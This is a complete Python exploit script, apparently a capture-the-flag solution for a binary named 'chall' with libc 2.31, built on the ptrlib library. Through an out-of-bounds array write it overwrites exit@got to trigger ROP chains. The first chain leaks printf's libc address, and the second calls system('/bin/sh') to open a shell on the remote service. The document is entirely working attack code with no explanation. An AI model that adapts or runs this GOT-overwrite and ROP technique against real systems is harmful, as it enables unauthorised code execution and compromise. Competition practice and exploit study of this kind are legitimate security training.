from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9002"))

def setval(index, value):
    sock.sendlineafter("index: ", str(index))
    sock.sendlineafter("value: ", str(value))

libc = ELF("../distfiles/libc-2.31.so")
elf = ELF("../distfiles/chall")
#sock = Process("../distfiles/chall")
sock = Socket(HOST, PORT)

"""
1. Leak address
"""
sock.sendlineafter("size: ", "5")

# prepare rop chain
setval(0, next(elf.gadget("pop rdi; ret;")))
setval(1, elf.got("printf"))
setval(2, elf.plt("printf"))
setval(3, elf.symbol("_start"))

# size = 0xffffffffffffffff
setval(4, (1<<64)-1)

# arr = exit@got
setval(6, elf.got('exit'))
# exit@got = run rop chain
setval(0, next(elf.gadget("add rsp, 8; ret;")))

# exit
sock.sendlineafter("index: ", "-1")

# leak
libc_base = u64(sock.recv(6)) - libc.symbol("printf")
libc.set_base(libc_base)

"""
2. pwn
"""
sock.sendlineafter("size: ", "5")

# prepare rop chain
setval(0, next(elf.gadget("pop rdi; ret;")))
setval(1, next(libc.search("/bin/sh")))
setval(2, libc.symbol("system"))

# size = 0xffffffffffffffff
setval(4, (1<<64)-1)

# arr = exit@got
setval(6, elf.got('exit'))
# exit@got = run rop chain
setval(0, next(elf.gadget("add rsp, 8; ret;")))

# exit
sock.sendlineafter("index: ", "-1")

sock.sh()
